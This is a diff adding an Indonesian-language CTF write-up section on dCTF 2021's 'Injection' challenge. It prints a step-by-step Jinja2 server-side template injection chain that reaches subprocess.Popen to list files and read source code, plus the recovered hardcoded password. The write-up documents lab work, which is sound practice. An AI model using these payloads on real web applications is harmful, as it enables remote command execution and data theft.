@@ -31,6 +31,7 @@ dCTF 2021 diselenggarakan oleh DragonSec SI dimulai dari hari Jum'at jam 15:00 U
     - [DevOps vs SecOps](#devops-vs-secops)
     - [Secure API](#secure-api)
     - [Very secure website](#very-secure-website)
+    - [Injection](#injection)
 
 </details>
 
@@ -334,7 +335,8 @@ Flag: **dctf{H3ll0_fr0m_1T_guy}**
 
 ### Secure API
 ```
-Frontend is overrated! API rocks! http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/
+Frontend is overrated! API rocks!
+http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/
 ```
 
 Mencoba mengakses url tersebut dengan Insomnia API Client, ternyata disuruh login. Karna tidak diberitahu endpoint untuk login, saya menebak-nebak. Ternyata di `/login`. Jadi langsung saja login sebagai guest. `guest:guest`. Berhasil login, didapatkan JWT token.
@@ -416,6 +418,54 @@ Dalam hal ini, saya mencoba '479763000' untuk password, karena akan menghasilkan
 Dan dapat flagnya.
 
 Flag: **dctf{It's_magic._I_ain't_gotta_explain_shit.}**
+
+## Injection
+```
+Our local pharmacy exposed admin login to the public, can you exploit it?
+http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/
+```
+
+Saya langsung mengakses url tersebut, dan muncul halaman login. Anehnya sewaktu login, diarahkan ke halaman 404.
+![Page 404](Injection.png)
+Saya menduga ini template injection. Jadi, saya masukkan payload `{{ config }}` lalu...
+![Config Payload](Injection2.png)
+
+Ternyata memang benar template injection. Langsung saja saya ulik-ulik pakai payload lain. Mencoba payload `{{ config.items() }}` saya menemukan ini:
+```
+('WCONTINUED', 8), ('WCOREDUMP', <built-in function WCOREDUMP>), ('WEXITED', 4), ('WEXITSTATUS', <built-in function WEXITSTATUS>), ('WIFCONTINUED', <built-in function WIFCONTINUED>), ('WIFEXITED', <built-in function WIFEXITED>), ('WIFSIGNALED', <built-in function WIFSIGNALED>), ('WIFSTOPPED', <built-in function WIFSTOPPED>), ('WNOHANG', 1), ('WNOWAIT', 16777216), ('WSTOPPED', 2), ('WSTOPSIG', <built-in function WSTOPSIG>), ('WTERMSIG', <built-in function WTERMSIG>), ('WUNTRACED', 2), ('W_OK', 2), ('X_OK', 1)]) doesn't exist :(
+```
+Yak, ternyata SSTI Vuln. Langsung saja dieksploit. Saya memasukkan payload `{{ ''.__class__.__mro__ }}`. Dapat respon:
+```
+Oops! Page login(<class 'str'>, <class 'object'>) doesn't exist :(
+```
+Saya coba masuk ke subclassnya. `{{ ''.__class__.__mro__[1].__subclasses__() }}`. Dan beruntungnya saya, di sana terdapat kelas `subprocess.Popen`. Saya bisa exec shell nih 😁. Langsung saja saya mengakses subclass tersebut yang terdapat di index 414 dengan payload `{{''.__class__.__mro__[1].__subclasses__()[414]}}`. Didapatkan respon:
+
+```
+Oops! Page login<class 'subprocess.Popen'> doesn't exist :(
+```
+
+Yak, sekarang saya sudah bisa melakukan shell exec di sini. Jadi langsung saja masukkan payload `{{ ''.__class__.__mro__[1].__subclasses__()[414]('ls',shell=TRUE,stdout=-1).communicate()}}`. Didapatkan respon:
+
+```
+Oops! Page login(b'app.py\nlib\nstatic\ntemplates\n', None) doesn't exist :(
+```
+
+Terdapat tiga direktori di sana, yaitu lib, static, dan templates. Mari kita lihat direktori lib. Dengan memasukkan payload `{{ ''.__class__.__mro__[1].__subclasses__()[414](['ls', 'lib'],shell=TRUE,stdout=-1).communicate()}}`. Didapatkan respon:
+```
+Oops! Page login(b'security.py\n', None) doesn't exist :(
+```
+
+Terdapat file `security.py`. Langsung saja saya liat isinya dengan payload `{{ ''.__class__.__mro__[1].__subclasses__()[414](['cat', 'lib/security.py'],shell=TRUE,stdout=-1).communicate()}}`. Didapatkan respon:
+```
+Oops! Page login(b"import base64\n\n\ndef validate_login(username, password):\n if username != 'admin':\n return False\n \n valid_password = 'QfsFjdz81cx8Fd1Bnbx8lczMXdfxGb0snZ0NGZ'\n return base64.b64encode(password.encode('ascii')).decode('ascii')[::-1].lstrip('=') == valid_password\n\n", None) doesn't exist :(
+```
+
+Di variabel valid_password terdapat string base64 yang direverse. Jadi saya coba decode saja base64nya.
+
+![Koki Siber](Injection3.png)
+
+Flag: **dctf{4ll_us3r_1nput_1s_3v1l}**
+
 
 #### Penutup
 Itulah beberapa _challenge_ yang berhasil saya kerjakan. Untuk _challenge_ lainnya dikerjakan oleh anggota tim saya. Mereka juga menerbitkan writeup seperti ini.
